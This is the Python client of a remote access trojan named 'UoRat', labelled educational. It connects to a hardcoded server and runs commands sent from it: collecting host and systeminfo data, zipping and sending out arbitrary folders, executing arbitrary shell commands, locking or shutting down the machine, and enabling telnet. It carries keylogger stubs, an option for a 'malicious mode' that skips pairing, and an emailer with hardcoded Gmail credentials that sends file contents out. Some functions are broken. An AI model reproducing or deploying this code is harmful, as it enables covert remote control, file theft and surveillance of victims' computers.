"""

+-----------------------------------------------------------------------+
|                               UoRat                                   |
|    Author: 27016005                                                   |
|    Version: 0.3.0                                                     |
|    Last update: 08-04-2021 (dd-mm-yyyy)                               |
|                                                                       |
|                 [   ONLY FOR EDUCATIONAL PURPOSES   ]                 |
+-----------------------------------------------------------------------+

"""
import datetime                                 # Scheduler
import os                                       # running commands
import platform                                 # System information
import schedule                                 # Scheduler
import smtplib                                  # Emailer
import socket                                   # Socket Connection
import subprocess                               # Running commands
import sys                                      # System Information
import time                                     # Sleep
from pprint import pprint                       # Pretty Printing & Output
from zipfile import ZipFile                     # Zipping Archives for file transfer

from pynput.keyboard import Controller, Key     # Keylogger


class Client:
# ''' SET UP CONNECTION '''
    def __init__(self, server_ip, port, buffer_size, client_ip):
        self.SERVER_IP = server_ip
        self.PORT = port
        self.BUFFER_SIZE = buffer_size
        self.CLIENT_IP = client_ip
        self.recvcounter = 0
        self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.FinalSwitcher = {
            "-Host": self.sendHostInfo,
                "-Msg": self.txtmsg,
                "-Fsend": self.filesend,
                "-RP": self.runprocess,
                "-RR": self.runrun,
                "-Telnet": self.enableTN,
                "-Chess": self.playchess,
                "-EpIV": self.playstarwars,
                "-Weather": self.weather,
                "-lock": self.locksystem,
                "-shutdown": self.shutdown,
                "-shutdownM": self.shutdownmessage,
                "-restart": self.restart,
                "-shell": self.fakeshell,
                "-loop": self.endless
        }
    def connectToServer(self):
        self.client.connect((self.SERVER_IP, self.PORT))

    def confirmconnection(self):
        gendkey = self.client.recv(self.BUFFER_SIZE).decode()
        print(gendkey)
        acceptancecode = input("Enter the Given Key: ")

        if acceptancecode != gendkey:
            # todo
            print("Pairing Failed")
            self.client.send("MISMATCH".encode("utf-8"))
            self.client.close()

        else:
            print("KEYS MATCHED - PAIRING SUCCESSFUL")
            self.client.send("MATCH".encode("utf-8"))

    # try to update buffer size
    def updateBuffer(self, size):
        buff = ""
        for counter in range(0, len(size)):
            if size[counter].isdigit():
                buff += size[counter]

        return int(buff)

    # for big files
    def saveBigFile(self, size, buff):
        full = b''
        while True:
            if sys.getsizeof(full) >= size:
                break

            recvfile = self.client.recv(buff)

            full += recvfile

        return full

    def sendHostInfo(self):
        """ Extracting host information """

        host = sys.platform
        self.client.send(host.encode("utf-8"))
        # Make a Dictionary
        sys_info = {
            "Platform": platform.system(),
            "Platform Release": platform.release(),
            "Platform Version": platform.version(),
            "Platform Architecture": platform.architecture(),
            "Machine Type": platform.machine(),
            "Platform Node": platform.node(),
            "Platform Information": platform.platform(),
            "ALL": platform.uname(),
            "HostName": socket.gethostname(),
            "Host IP_Address": socket.gethostbyname(socket.gethostname()),
            "CPU": platform.processor(),
            "Python Build": platform.python_build(),
            "Python Compiler": platform.python_compiler(),
            "Python Version": platform.python_version(),
            "Windows Platform": platform.win32_ver()
            #  "OS": os.uname() # os.uname() ONLY SUPPORTED ON LINUX
        }
        # https://www.geeksforgeeks.org/platform-module-in-python/#:~:text=Python%20defines%20an%20in%2Dbuilt,program%20is%20being%20currently%20executed.
        cpu = platform.processor()
        system = platform.system()
        machine = platform.machine()

        with open('./logs/info.txt', 'w+') as f:
            for k, v in sys_info.items():
                f.write(str(k) + ' >>> ' + str(v) + '\n\n')

        with open('./logs/info.txt', 'rb+') as f:
            self.client.send(f.read())
        print("CPU: " + cpu + '\n', "System: " + system + '\n', "Machine: " + machine + '\n')
        input()
        pprint(sys_info)
        input()
        self.sysinfViaCMDFile()

    def sysinfViaCMDFile(self):
        # traverse the info
        Id = subprocess.check_output(['systeminfo']).decode('utf-8').split('\n')
        new = []

        # arrange the string into clear info
        for item in Id:
            new.append(str(item.split("\r")[:-1]))
        with open("./logs/moreinfoC.txt", "w+") as f:
            for i in new:
                print(i[2:-2])
                f.write(i[2:-2] + "\n")
        with open('./logs/moreinfoC.txt', 'rb+') as f:
            # self.client.send(os.path.getsize('./logs/moreinfoC.txt').encode())
            c = f.read()
            print(len(c))
            time.sleep(1)
            self.client.send((str(len(c))).encode())
            time.sleep(10)
            self.client.send(c)

    # ''' WINDOWS FUNCTIONS '''
    def locksystem(self):
        msg = "rundll32.exe user32.dll, LockWorkStation"
        self.runrun(msg)
        self.client.send("[+] PC Locked".encode("utf-8"))

    def shutdown(self):
        #msg = "shutdown /s"
        #self.runrun(msg)
        # self.client.send("[+] PC SHUTDOWN.".encode("utf-8"))
        self.locksystem()

    def shutdownmessage(self):
        message = self.client.recv(self.BUFFER_SIZE).decode()
        msg = "shutdown /s /e '" + message + "' "
        # msg = "shutdown /s /e 'You've been hacked '"
        self.runrun(msg)
        self.client.send(("[+] PC SHUTDOWN WITH MESSAGE." + msg).encode("utf-8"))

    def restart(self):
        msg = "shutdown /r"
        self.runrun(msg)
        self.client.send("[+] PC RESTARTED.".encode("utf-8"))

# ''' TELNET FUNCTIONS '''
    def enableTN(self):
        msg = "start /B start cmd.exe @cmd /c pkgmgr /iu:TelnetClient "
        self.runrun(msg)
        self.client.send("[+] Telnet Client Enabled".encode("utf-8"))

    def playchess(self):
        msg = "start /B start cmd.exe @cmd /c telnet freechess.org "
        self.runrun(msg)
        self.client.send("[+] Target is now playing Chess".encode("utf-8"))
        # chess_true = subprocess.check_call("start /B start cmd.exe @cmd /k telnet freechess.org ", shell=True)

    def playstarwars(self):
        msg = "start /B start cmd.exe @cmd /c telnet towel.blinkenlights.nl "
        self.runrun(msg)
        self.client.send("[+] Target is now Watching Star Wars Ep.IV: A New Hope".encode("utf-8"))
        # Sw = subprocess.check_call("start /B start cmd.exe @cmd /c telnet towel.blinkenlights.nl ", shell=True)

    def weather(self):
        msg = "start /B start cmd.exe @cmd /c telnet rainmaker.wunderground.com "
        self.runrun(msg)
        self.client.send("[+] Target is now checking the Weather".encode("utf-8"))
        # weather = subprocess.check_call("start /B start cmd.exe @cmd /c telnet rainmaker.wunderground.com ", shell=True)

# ''' KEYLOGGER FUNCTIONS '''
    def enableKeyLogger(self):
        pass
    def disableKeylogger(self):
        def stopKeyLogger(self):
            """ press esc key to stop the key logger """

            keyboard = Controller()
            keyboard.press(Key.esc)
            keyboard.release(Key.esc)
            self.keyLogger = False
    def keylogs(self):
        pass

# ''' CMD Functions '''
    def runprocess(self, msg):
        obj = subprocess.Popen(msg, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE,
                               shell=True)
        output = (obj.stdout.read() + obj.stderr.read()).decode("utf-8", errors="ignore")
        print("A")
        if output == "" or output == "\n":
            print("B")
            self.client.send("[*] Done".encode("utf-8"))
        else:
            print("C")
            self.client.send(output.encode("utf-8"))

    def runrun(self, msg):
        obj = "failed"
        try:
            obj, _ = subprocess.run(msg, check=True, shell=True)
            # output = (obj.stdout.read() + obj.stderr.read()).decode("utf-8", errors="ignore")
        except Exception as e:
            print("This failed too (runrun) : " + str(e) + " + " + str(obj))

    def MSGBOX(self):
        insert = "this is a test"

        msgA = '(echo MsgBox "' + insert + '" ^& vbCrLf ^& "Line 2",262192, "Title")> File.vbs'
        self.runrun(msgA)
        msgB = 'start File.vbs'
        self.runrun(msgB)

    def txtmsg(self):
        print("TextMessageMode: Activated")
        message = self.client.recv(self.BUFFER_SIZE).decode()
        print("Server:", message)
        # self.send(output.encode())
        time.sleep(2)
        self.client.send("[+] Message displayed and closed.".encode("utf-8"))

    def filesend(self):
        print("FILE SEND MODE: Enabled")
        filePath = self.client.recv(self.BUFFER_SIZE).decode("utf-8")
        filelist = os.listdir(filePath)
        self.client.send("Success".encode("utf-8"))
        # create a zip archive
        archname = './logs/files.zip'
        archive = ZipFile(archname, 'w')
        for file in filelist:
            archive.write(filePath + '/' + file)
        archive.close()
        # send size
        archivesize = os.path.getsize(archname)
        self.client.send(str(archivesize).encode("utf-8"))
        # send archive
        with open('./logs/files.zip', 'rb') as to_send:
            self.client.send(to_send.read())
            print("Should have worked.")
        # os.remove(archname)

    def fakeshell(self):
        """ Shell """

        print("SHELL MODE ENABLED: ")
        msg = (self.client.recv(self.BUFFER_SIZE).decode("utf-8"))
        if "cd" in msg.lower():
            try:
                d = msg[3:].strip()
                os.chdir(d)
                self.client.send("[*] Done".encode("utf-8"))
            except:
                self.client.send("[*] Dir not found / something went wrong.".encode("utf-8"))
        else:
            # subprocess.checkoutput
            self.runprocess(msg)
            # self.runrun(msg)

    def endless(self):
        malorgood = input("Enter 1 to run in malicious mode or 2 to run in virtuous mode: ")
        if malorgood == "1":
            print("Malicious mode enabled: ")
            self.client.send("1".encode("utf-8"))
        else:
            print("Virtuous mode enabled: ")
            self.client.send("2".encode("utf-8"))
            self.confirmconnection()
        while True:
            print("entered loop")
            msg = (self.client.recv(self.BUFFER_SIZE).decode("utf-8"))
            print("message received {msg} = "+str(msg))
            try:
                func = self.FinalSwitcher.get(msg)
                func()
            except TypeError:
                print("This operation does not exist. ")
            except Exception as e:
                print("Even I don't know how you got this error - so I'll lock the pc. " + str(e))

                print("Server: msg = " + msg)
                self.client.send("[+] Message displayed and closed.".encode("utf-8"))

# ''' EMAILER FUNCTIONS '''
    def emailsendbody(self, body):
        # creates SMTP session
        s = smtplib.SMTP('smtp.gmail.com', 587)
        s.ehlo()

        # start TLS for security
        s.starttls()

        # Authentication
        s.login("uor.27016005@gmail.com", "C0mput3rSc13nc3")

        # message to be sent
        message = "Subject:{0}\n\n{1}".format(datetime.datetime.now().strftime("%d-%m-%y %H:%M:%S"), body)
        print(message)

        # sending the mail
        s.sendmail("uor.27016005@gmail.com", "dannyb0903@gmail.com", message)

        # terminating the session
        s.quit()

    def emailsendfilepath(self, filepath):
        if os.path.exists(filepath):
            with open(filepath, 'r') as file:
                body = file.read()
                self.emailsendbody(body)
        else:
            print("FILE DOESNT EXIST")

    def Scheduler(self):
        # SCHEDULER
        schedule.every().day.at("15:46").do(self.emailsendbody, "This is a schedule test")
        while True:
            schedule.run_pending()
            time.sleep(1)
def main():
    SERVER_IP = "192.168.56.1"  # modify me
    PORT = 1337  # modify me (if you want)
    BUFFER_SIZE = 2048
    safemode = bool(True)

    try:
        os.mkdir('./logs')
    except FileExistsError:
        pass

    CLIENT = socket.gethostname()
    CLIENT_IP = socket.gethostbyname(CLIENT)
    print(CLIENT_IP)
    client = Client(SERVER_IP, PORT, BUFFER_SIZE, CLIENT_IP)

    client.connectToServer()
    client.endless()


if __name__ == "__main__":
    main()
